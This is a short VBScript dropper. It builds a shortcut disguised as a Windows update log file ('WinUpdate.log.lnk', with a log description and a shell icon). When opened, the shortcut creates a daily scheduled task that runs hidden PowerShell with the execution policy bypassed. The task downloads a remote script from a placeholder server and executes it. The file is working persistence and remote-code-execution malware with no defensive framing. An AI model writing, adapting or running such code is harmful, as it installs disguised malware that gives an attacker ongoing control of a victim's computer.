Set jRxTu = WScript.CreateObject("WScript.Shell")
lnk = "C:\windows\temp\WinUpdate.log.lnk"
Set mkLnk = jRxTu.CreateShortcut(lnk)
    mkLnk.TargetPath = "C:\Windows\System32\schtasks.exe"
    mkLnk.Arguments = "/Create /F /TN WinUpdate /SC DAILY /ST 11:11 /TR ""powershell -ep Bypass -nop -w 1 \""iex ((New-Object Net.WebClient).DownloadString(\\\""'http://server/script.ps1\\\""))\"""
	mkLnk.IconLocation = "C:\windows\system32\SHELL32.dll,70"
    mkLnk.Description = "WinUpdate.log"
mkLnk.Save
